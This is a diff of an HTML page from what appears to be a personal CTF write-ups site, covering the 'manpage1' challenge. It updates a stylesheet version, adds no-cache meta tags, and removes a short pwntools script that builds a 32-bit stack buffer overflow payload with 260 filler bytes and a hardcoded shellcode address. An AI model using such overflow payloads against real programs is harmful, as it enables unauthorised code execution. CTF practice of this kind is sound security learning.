@@ -4,8 +4,15 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=b7c7ae198d0c0d5b433ba2f5ba28241351a2fd21">
-    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=429416b0fbd88183bc1fba2235ca959bf77e17b2">
+    
+<link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- remove the cache headers -->
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
 
 <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>manpage1 | Avishai’s CTF Writeups</title>
@@ -66,19 +73,6 @@
 <span class="c1">// gcc -m32 level1.c -o level1</span>
 
 </code></pre></div></div>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
-</span><span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">shellcode_adderss</span> <span class="o">=</span> <span class="mh">0xffffd549</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">260</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shellcode_adderss</span><span class="p">)</span>
-
-<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-</code></pre></div></div>
-<p>[level1.py]</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
 </span><span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
